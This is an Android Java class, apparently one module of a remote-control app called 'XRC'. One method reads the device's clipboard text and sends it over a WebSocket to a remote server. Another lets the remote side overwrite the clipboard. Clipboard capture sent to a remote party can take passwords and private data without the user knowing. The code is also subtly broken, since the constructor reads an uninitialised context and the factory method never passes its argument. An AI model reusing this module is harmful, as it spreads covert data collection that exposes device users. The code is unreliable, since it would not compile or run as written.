package com.xrc.system.features;

import android.content.ClipData;
import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public class ClipboardManager {
    private static final String TAG = Constants.TAG + ":Clip";
    private static ClipboardManager instance;
    private final Context ctx;
    private final android.content.ClipboardManager cm;

    private ClipboardManager() {
        this.ctx = ctx.getApplicationContext();
        this.cm = (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
    }

    public static synchronized ClipboardManager get(Context ctx) {
        if (instance == null) instance = new ClipboardManager();
        return instance;
    }

    public void readAndSend() {
        try {
            if (cm == null || !cm.hasPrimaryClip()) return;
            ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;
            CharSequence text = clip.getItemAt(0).getText();
            if (text == null) return;
            JSONObject data = new JSONObject();
            data.put("text", text.toString());
            XRCWebSocketClient.get(ctx).sendEvent("clipboard", data);
        } catch (JSONException e) {
            Log.e(TAG, "Clipboard read failed", e);
        }
    }

    public void setText(String text) {
        try {
            if (cm == null) return;
            cm.setPrimaryClip(ClipData.newPlainText("XRC", text));
        } catch (Exception e) {
            Log.e(TAG, "Clipboard set failed", e);
        }
    }
}
